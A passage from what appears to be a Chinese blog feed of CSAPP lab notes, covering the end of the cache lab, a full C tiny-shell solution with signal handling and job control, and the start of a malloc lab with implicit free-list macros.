class="hljs-number">7</span>][k] = a_7;<br>              &#125;<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>misses&#x3D;1227</p><h4 id="M-61-N-67"><a href="#M-61-N-67" class="headerlink" title="M&#x3D;61,N&#x3D;67"></a>M&#x3D;61,N&#x3D;67</h4><p>16*16分块即可</p><p>misses&#x3D;1992</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/484657229">CSAPP | Lab5-Cache Lab 深入解析 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/6,shell_lab/"/>
    <url>/project/2025/05/24/csapp/6,shell_lab/</url>
    
    <content type="html"><![CDATA[<h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>完善tsh.c  完成一个tiny shell，其具有以下功能：识别是内置命令还是可执行文件，实现ctrl-c和ctrl-z，以‘&amp;’结尾的命令后台运行，实现quit、jobs、bg <job>、 fg <job>、kill <job>这些内置命令，等。</p><p>具体而言 需要完善以下函数：</p><p>• eval: Main routine that parses and interprets the command line. [70 lines]</p><p>• builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</p><p>• do bgfg: Implements the bg and fg built-in commands. [50 lines]</p><p>• waitfg: Waits for a foreground job to complete. [20 lines]</p><p>• sigchld handler: Catches SIGCHILD signals. 80 lines]</p><p>• sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</p><p>• sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</p><p>实验给了参考的shell：tshref和辅助测试文件sdriver.pl</p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><ul><li>这里用到两处竞争消除</li></ul><p>一个是fork子程序前 屏蔽SIGCHLD；addjob后才允许处理SIGCHLG</p><p>一个是显式等待前台进程，在waitfg中使用sigsuspend函数</p><ul><li>由于jobs是全局变量 读写时要阻塞所有信号</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span>   <span class="hljs-comment">//参考教材p525</span><br>&#123;<br>    <span class="hljs-type">char</span> *argv[MAXARGS];<br>    <span class="hljs-type">int</span> bg;<br>    <span class="hljs-type">pid_t</span> pid;<br><br>    bg=parseline(cmdline,argv);   <span class="hljs-comment">//解析命令行 </span><br>    <span class="hljs-type">int</span> job_state=bg?BG:FG;<br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">0</span>]==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> ;  <span class="hljs-comment">// 跳过空行命令</span><br>    <br>    <span class="hljs-type">sigset_t</span> mask_all,prev,mask_one;<br>    sigfillset(&amp;mask_all);<br>    sigemptyset(&amp;mask_one);<br>    sigaddset(&amp;mask_one,SIGCHLD);<br>    <span class="hljs-keyword">if</span>(!builtin_cmd(argv))&#123;   <span class="hljs-comment">//非内置命令</span><br>        <span class="hljs-comment">//fork前阻塞SIGCHLD,参考教材p543，消除竞争 先addjob才能deletejob</span><br>        sigprocmask(SIG_BLOCK,&amp;mask_one,&amp;prev);   <br>        pid=fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;      <span class="hljs-comment">//子进程</span><br>            sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);  <span class="hljs-comment">//消除子进程的阻塞  </span><br>            setpgid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span>(execve(argv[<span class="hljs-number">0</span>],argv,environ)&lt;<span class="hljs-number">0</span>)&#123;   <span class="hljs-comment">//execve会替换原来内存空间的上下文信息</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s:command not found.\n&quot;</span>,argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-comment">//父进程</span><br>        sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev);   <span class="hljs-comment">//阻塞所有信号，保证全局变量jobs的修改是安全的</span><br>        addjob(jobs,pid,job_state,cmdline);<br>        sigprocmask(SIG_SETMASK,&amp;mask_one,<span class="hljs-literal">NULL</span>);  <span class="hljs-comment">//注意，这里要恢复成mask_one。必须先进入waitfg，之后才接收sigchld,//不然可能会造成阻塞在waitfg</span><br>        <span class="hljs-keyword">if</span>(!bg)&#123;   <span class="hljs-comment">//前台job   参考教材p545 消除竞争  显式等待进程</span><br>            waitfg(pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;    <span class="hljs-comment">//后台job    </span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid),pid,cmdline);<br>        &#125;    <br>        sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);    <br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;jobs&quot;</span>))&#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>    &#123;<br>    do_bgfg(argv);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 对单独的&amp;不处理</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&amp;&quot;</span>))<br>    &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dobg-fg"><a href="#dobg-fg" class="headerlink" title="dobg_fg"></a>dobg_fg</h3><p>使用sscanf格式化读取 对错误格式进行说明即可</p><p>利用kill发送信号 并修改jobs的state</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;   <br>    <span class="hljs-comment">//bg fg 没有参数</span><br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>]==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125; <br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>=</span><span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-comment">//含百分号的是jid</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;%%%d&quot;</span>,&amp;id)&gt;<span class="hljs-number">0</span>)&#123;<br>        job=getjobjid(jobs,id);<br>        <span class="hljs-keyword">if</span>(job==<span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d):No such process\n&quot;</span>,id);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//pid</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;%d&quot;</span>,&amp;id)&gt;<span class="hljs-number">0</span>)&#123;<br>        job=getjobpid(jobs,id);<br>        <span class="hljs-keyword">if</span>(job==<span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d):No such process\n&quot;</span>,id);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//格式错误</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s:aryment must be a PID or %%jobid\n&quot;</span>,argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;;<br><br>    <span class="hljs-comment">//bg stsp-&gt;cont</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;bg&quot;</span>)) &#123;<br>        kill(-(job-&gt;pid),SIGCONT);<br>        job-&gt;state=BG;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,job-&gt;jid,job-&gt;pid,job-&gt;cmdline);<br>    &#125;<br>    <span class="hljs-comment">//fg</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        kill(-(job-&gt;pid),SIGCONT);<br>        job-&gt;state=FG;<br>        waitfg(job-&gt;pid);<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>sigsuspend函数 显式等待信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//参考教材p543 显式等待信号</span><br><span class="hljs-comment">//子进程是由处理函数waitpid回收的，此处利用fgpid检查前台进程是否结束，未结束则利用sigsuspend休眠shell</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span>  <br>&#123;   <br>    <span class="hljs-type">sigset_t</span> mask;<br>    sigemptyset(&amp;mask);<br>    <span class="hljs-keyword">while</span>(fgpid(jobs)!=<span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">//前台程序未结束 则挂起 直到收到sigchld；</span><br>        sigsuspend(&amp;mask);<br>    &#125;       <br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>这里的waitpid需要设置option参数 不可以使用0  原因参考注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//子进程停止或终止会触发sigchld</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span>  <span class="hljs-comment">//参考教材p543    该函数回收子进程 且删除job</span><br>&#123;<br>    <span class="hljs-type">int</span> olderrno=errno;<br>    <span class="hljs-type">sigset_t</span> mask_all,prev;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> status;<br><br>    sigfillset(&amp;mask_all);<br>    <span class="hljs-comment">/*  这里pid=waitpid(-1,&amp;status,0))不能使用默认的0参数，否则waitpid会出现难以排查的bug，可以测试看一下。</span><br><span class="hljs-comment">        原因是/bin/echo是前台进程，父进程会进入waitfg，并进入sigsuspend挂起，直到父程序捕获并从处理函数返回后，它才会继续。</span><br><span class="hljs-comment">        但是echo子进程终止后，父进程调用sigchld_handler,并进入这个while循环回收子进程，之后，在下次循环时，会在waitpid阻塞；</span><br><span class="hljs-comment">        我们不希望waitpid阻塞，而是希望其立即返回,之后waitfg才能正常返回，父进程才能继续。*/</span><br>    <span class="hljs-comment">// no child process时 waitpid返回-1</span><br>    <span class="hljs-keyword">while</span>((pid=waitpid(<span class="hljs-number">-1</span>,&amp;status,WNOHANG|WUNTRACED))&gt;<span class="hljs-number">0</span>)&#123; <br><br>        sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev);       <span class="hljs-comment">//全局变量读写保护</span><br>        <span class="hljs-comment">//正常退出</span><br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))&#123; <br>            <span class="hljs-comment">// printf(&quot;pid :%d,exit :%s&quot;,pid,getjobpid(jobs,pid)-&gt;cmdline);</span><br>            <span class="hljs-comment">// fflush(stdout);</span><br>            deletejob(jobs,pid);  <br>        &#125;<br>        <span class="hljs-comment">//ctrl-c 产生SIGINT , 处理函数利用kill向前台进程发送信号  信号导致前台进程终止 </span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(WIFSIGNALED(status))&#123;   <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>,pid2jid(pid),pid,WTERMSIG(status));<br>            deletejob(jobs,pid);<br>        &#125;<br>        <span class="hljs-comment">//ctrl-z 产生SIGTSTP ,其处理函数利用kill向前台进程发送信号 导致前台进程停止</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(WIFSTOPPED(status))&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>,pid2jid(pid),pid,WSTOPSIG(status));<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>=</span>getjobpid(jobs,pid);<br>            job-&gt;state=ST;<br>        &#125;<br>        sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    errno=olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//由于子进程执行execve，其内存空间上下文被替换了，是全新的程序，因此和父进程就没关系了。</span><br><span class="hljs-comment">//新程序不会接受键盘的信号，并且其信号处理都是默认的；</span><br><span class="hljs-comment">//键盘的ctrl-c 和ctrl-z信号发送到shell主程序，主程序调用信号处理函数，利用kill向新程序发送信号。</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> olderrno=errno;<br>    <span class="hljs-type">pid_t</span> fg_pid;<br>    fg_pid=fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(fg_pid!=<span class="hljs-number">0</span>)<br>        kill(-fg_pid,sig);   <span class="hljs-comment">//利用kill发送信号  这里要加负号 向子进程的进程组中的所有进程发送信号</span><br>    errno=olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> olderrno=errno;<br>    <span class="hljs-type">pid_t</span> fg_pid;<br>    fg_pid=fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(fg_pid!=<span class="hljs-number">0</span>)<br>        kill(-fg_pid,sig);   <span class="hljs-comment">//利用kill发送信号</span><br>    errno=olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/492645370">CSAPP | Lab7-Shell Lab 深入解析 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/89224358">CSAPP实验之shell lab - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/7,malloc_lab/"/>
    <url>/project/2025/05/24/csapp/7,malloc_lab/</url>
    
    <content type="html"><![CDATA[<h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>修改下列函数 实现动态内存分配器 类似与libc的malloc</p><p>要求8字节对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>; <br><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span>; <br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span>;  <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>```，-t指定trace目录，-f指定单个trace测试文件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs 利用mdriver.c进行测试"><br>允许使用`memlib.c`的函数，不允许使用其他动态内存分配库，不允许使用复合数据结构（如结构体等）<br><br>利用`gprof`优化性能，利用宏简化指针计算<br><br>### 开始<br><br>**make后，发现实验缺少trace文件**<br><br>补充trace文件，并在测试时指定路径  ```./mdriver -V -t traces/```<br><br>#### 采用隐式空闲链表 实现基础功能 <br><br>##### 原理及代码参考课本<br><br>其思路比较简单，头部和尾部存储块信息，这样就可以遍历所有块，从而间接的遍历空闲块。<br><br>因此其缺点是，块的搜索时间与块总数是线性关系。<br><br>![image-20240912170207692](./image/7,malloc_lab_image/image-20240912170207692.png)<br><br>堆的组织方式如下，每个方格是4字节的，头部和尾部的设计消除了合并时的边界影响。<br><br>![image-20240912170104109](./image/7,malloc_lab_image/image-20240912170104109.png)<br><br>空闲块合并时有以下四种情况。采用立即合并。<br><br>![image-20240912170221870](./image/7,malloc_lab_image/image-20240912170221870.png)<br><br>##### 代码<br><br>```c<br>/* 基础宏*/<br>#define WSIZE 4 // 字长4字节，块头尾信息也为4字节<br>#define DSIZE 8<br>#define CHUNKSIZZE (1 &lt;&lt; 12) // 堆初始化大小 4KB 正好是页大小<br><br>#define MAX(x, y) ((x) &gt; (y)) ? (x) : (y)<br>/* 把块大小和信息位结合*/<br>#define PACK(size, alloc) ((size) | (alloc))<br>/* 在地址p处读写 */<br>#define GET(p) (*(unsigned int *)(p))<br>#define PUT(p, val) (*(unsigned int *)(p) = (val))<br><br>/* 从头部或脚部 获取块大小和信息位的值 */<br>#define GET_SIZE(p) (GET(p) &amp; ~0x07)<br>#define GET_ALLOC(p) (GET(p) &amp; 0x1)<br><br>/*给定块指针bp，其指向有效载荷，计算头部和尾部指针*/<br>#define HDRP(bp) ((char *)(bp) - WSIZE)<br>#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)<br><br>/* 给定块指针bp, 计算先前块和后面块的地址 